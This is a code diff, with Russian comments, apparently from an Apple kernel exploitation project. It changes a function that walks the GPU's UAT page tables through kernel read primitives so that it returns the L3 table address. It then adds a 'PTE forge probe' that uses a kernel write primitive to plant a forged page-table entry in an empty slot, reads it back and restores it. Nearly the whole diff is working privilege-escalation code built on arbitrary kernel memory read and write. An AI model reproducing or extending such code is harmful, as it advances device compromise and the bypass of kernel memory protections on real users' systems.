@@ -5227,14 +5227,15 @@ static void *kpParkWorker(void *arg)
 }
 
 // Полный walk+скан одного mapper'а: L1arr → L2 → L3 → наш PTE, скан L3 по PA.
-static void kpUatWalkScan(NSMutableString *r, uint64_t mapper, uint64_t gpuVA, uint64_t pa0, const char *label)
+// Возвращает kernel VA L3-страницы (или 0).
+static uint64_t kpUatWalkScan(NSMutableString *r, uint64_t mapper, uint64_t gpuVA, uint64_t pa0, const char *label)
 {
     extern uint64_t kp_rc_kread64(uint64_t);
-    if (!kpLooksLikeKernelPointer(mapper)) { kpNote(r, [NSString stringWithFormat:@"  walk[%s]: mapper невалиден", label]); return; }
+    if (!kpLooksLikeKernelPointer(mapper)) { kpNote(r, [NSString stringWithFormat:@"  walk[%s]: mapper невалиден", label]); return 0; }
     kpNote(r, [NSString stringWithFormat:@"  walk[%s]: mapper=%#llx ops[0]=%#llx", label, mapper, kp_rc_kread64(mapper)]);
     uint64_t L1arr = kp_untag_ptr(kp_rc_kread64(mapper + 0x30));
     kpNote(r, [NSString stringWithFormat:@"  walk[%s]: L1arr=%#llx", label, L1arr]);
-    if (!L1arr) return;
+    if (!L1arr) return 0;
     uint32_t pc = (uint32_t)((gpuVA >> 36) & 0x7FF);
     uint32_t pd = (uint32_t)((gpuVA >> 25) & 0x7FF);
     uint32_t pt = (uint32_t)((gpuVA >> 14) & 0x7FF);
@@ -5242,12 +5243,12 @@ static void kpUatWalkScan(NSMutableString *r, uint64_t mapper, uint64_t gpuVA, u
     uint64_t L2pa = e1 & 0xFFFFFFFFF000ULL;
     uint64_t L2 = (L2pa && gPrimitives.phystokv) ? gPrimitives.phystokv(L2pa) : 0;
     kpNote(r, [NSString stringWithFormat:@"  walk[%s]: pc=%u e1=%#llx → L2kv=%#llx", label, pc, e1, L2]);
-    if (!L2) return;
+    if (!L2) return 0;
     uint64_t e2 = kp_rc_kread64(L2 + (uint64_t)pd * 8);
     uint64_t L3pa = e2 & 0xFFFFFFFFF000ULL;
     uint64_t L3 = (L3pa && gPrimitives.phystokv) ? gPrimitives.phystokv(L3pa) : 0;
     kpNote(r, [NSString stringWithFormat:@"  walk[%s]: pd=%u e2=%#llx → L3kv=%#llx", label, pd, e2, L3]);
-    if (!L3) return;
+    if (!L3) return 0;
     uint64_t pte = kp_rc_kread64(L3 + (uint64_t)pt * 8);
     kpNote(r, [NSString stringWithFormat:@"  walk[%s]: pt=%u PTE=%#llx (наш PA=%#llx)", label, pt, pte, pa0]);
     int nnz = 0;
@@ -5261,6 +5262,7 @@ static void kpUatWalkScan(NSMutableString *r, uint64_t mapper, uint64_t gpuVA, u
             kpNote(r, [NSString stringWithFormat:@"  ★ НАШ PTE: %s L3[%d]=%#llx", label, j, e]);
     }
     kpNote(r, [NSString stringWithFormat:@"  walk[%s]: L3 живых записей: %d%@", label, nnz, nz]);
+    return L3;
 }
 
 #pragma mark - GART recon (IOGPU → AGXSecureGart, read-only)
@@ -5466,9 +5468,32 @@ static void kpDumpPtrFields(NSMutableString *r, uint64_t objVA, const char *name
             kpNote(r, [NSString stringWithFormat:@"  canary[0xaa2c418]=%#llx (ждём 0x7FF000000000) · globalMapper=%#llx", canary, gMapper]);
             // mapper 1: IOUAT+0x20
             uint64_t mapper1 = kp_untag_ptr(kp_rc_kread64(uat + 0x20));
-            kpUatWalkScan(r, mapper1, gpuVA, pa0, "iouat+20");
+            uint64_t L3kv = kpUatWalkScan(r, mapper1, gpuVA, pa0, "iouat+20");
             // mapper 2: global
             kpUatWalkScan(r, gMapper, gpuVA, pa0, "global");
+
+            // 8. PTE forge probe (benign): тип фрейма L3 + запись в пустой слот
+            //    (phys = НАШ собственный буфер) + readback + restore.
+            if (L3kv && pa0) {
+                uint64_t tableVA = [self frameTableVAWithLog:r];
+                int ft = kpVAType(L3kv, tableVA);
+                kpNote(r, [NSString stringWithFormat:@"  frame type L3 страницы = 0x%x (0x21=heap RW — пишется)", ft]);
+                int emptySlot = -1;
+                for (int j = 200; j < 2048; j++) if (kp_rc_kread64(L3kv + (uint64_t)j * 8) == 0) { emptySlot = j; break; }
+                kpNote(r, [NSString stringWithFormat:@"  пустой слот: %d", emptySlot]);
+                if (emptySlot >= 0) {
+                    uint64_t live = kp_rc_kread64(L3kv); // живой эталон attrs
+                    uint64_t forge = (pa0 & 0xFFFFFFFFF000ULL) | (live & ~0xFFFFFFFFF000ULL);
+                    uint64_t slotVA = L3kv + (uint64_t)emptySlot * 8;
+                    extern void kp_rc_kwrite64(uint64_t, uint64_t);
+                    kp_rc_kwrite64(slotVA, forge);
+                    uint64_t rb = kp_rc_kread64(slotVA);
+                    kpNote(r, [NSString stringWithFormat:@"  PTE forge: wrote=%#llx read=%#llx → %@",
+                               forge, rb, rb == forge ? @"ЗАПИСЬ ПРИЛИПЛА" : @"не прилипла"]);
+                    kp_rc_kwrite64(slotVA, 0);
+                    kpNote(r, [NSString stringWithFormat:@"  restore: %#llx", kp_rc_kread64(slotVA)]);
+                }
+            }
             // сырой дамп IOUAT (ненулевые) — для офлайн-разбора
             NSMutableString *ud = [NSMutableString stringWithString:@"  IOUAT nonzero:"];
             int nu = 0;
